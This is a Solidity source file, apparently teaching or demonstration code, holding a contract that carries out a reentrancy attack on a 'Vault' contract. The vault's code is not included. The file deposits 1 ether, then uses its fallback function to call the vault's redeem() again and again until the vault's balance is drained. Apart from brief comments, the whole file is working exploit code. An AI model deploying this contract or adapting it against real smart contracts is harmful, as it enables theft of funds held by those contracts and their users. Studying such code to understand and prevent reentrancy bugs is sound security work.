// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

contract Reentrancy {
    // instance of the attacked contract
    Vault public vault;

    constructor(address _vaultAddress) {
        vault = Vault(_vaultAddress);
    }

    // Fallback is called when Vault sends Ether to this contract.
    fallback() external payable {
        if (address(vault).balance >= 1 ether) {
            vault.redeem();
        }
    }

    // function used to attack. It creates a loop.
    function attack() external payable {
        require(msg.value >= 1 ether);
        vault.store{value: 1 ether}();
        vault.redeem();
    }

    // return the balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
